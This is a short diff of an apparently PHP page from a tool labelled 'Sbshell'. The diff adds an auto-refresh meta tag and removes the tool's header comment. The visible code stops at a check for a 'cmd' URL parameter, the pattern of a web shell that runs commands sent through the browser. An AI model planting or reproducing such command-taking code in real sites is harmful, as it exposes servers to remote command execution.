@@ -1,5 +1,7 @@
 <head>
 <link rel="stylesheet" type="text/css" href="style.css">
+ <meta http-equiv="refresh" content="10">
+
 
 <?php
 
@@ -11,14 +13,6 @@ echo "</pre>";
 
 
 }
-
-### Sbshell version 3.0
-#
-#  Covered by Apache License
-#  12/14/2015
-#
-#
-# Files: sbshell,index.php,sbstyle.css
 
 
 if ($_GET['cmd'])
